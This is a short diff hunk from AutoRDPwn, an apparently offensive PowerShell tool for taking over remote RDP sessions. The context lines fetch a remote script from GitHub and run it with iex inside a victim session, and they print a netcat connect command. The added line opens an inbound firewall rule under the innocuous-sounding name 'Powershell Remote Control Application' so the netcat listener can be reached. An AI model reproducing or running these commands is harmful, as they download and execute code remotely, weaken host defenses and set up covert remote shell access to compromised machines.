@@ -550,6 +550,7 @@ Write-Host "--------------------------------------------------------------------
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host
+netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
